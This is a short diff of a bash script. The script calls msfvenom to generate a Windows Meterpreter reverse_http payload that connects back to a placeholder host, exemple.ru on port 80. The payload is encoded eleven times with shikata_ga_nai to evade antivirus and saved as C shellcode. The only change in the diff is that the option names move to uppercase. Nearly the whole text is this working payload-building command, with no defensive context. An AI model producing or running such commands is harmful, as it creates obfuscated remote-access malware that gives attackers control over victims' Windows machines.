@@ -1,9 +1,9 @@
 #!/bin/bash          
 #
 msfvenom -p windows/meterpreter/reverse_http \
-                    lhost=exemple.ru \
-                    lport=80 \
-                    luri=exemple.php \
+                    LHOST=exemple.ru \
+                    LPORT=80 \
+                    LURI=exemple.php \
                     -e x86/shikata_ga_nai -i 11 \
                     -f c -a x86 --platform Windows > sc.txt
 #./format.sh sc.txt > scclean.txt && rm sc.txt
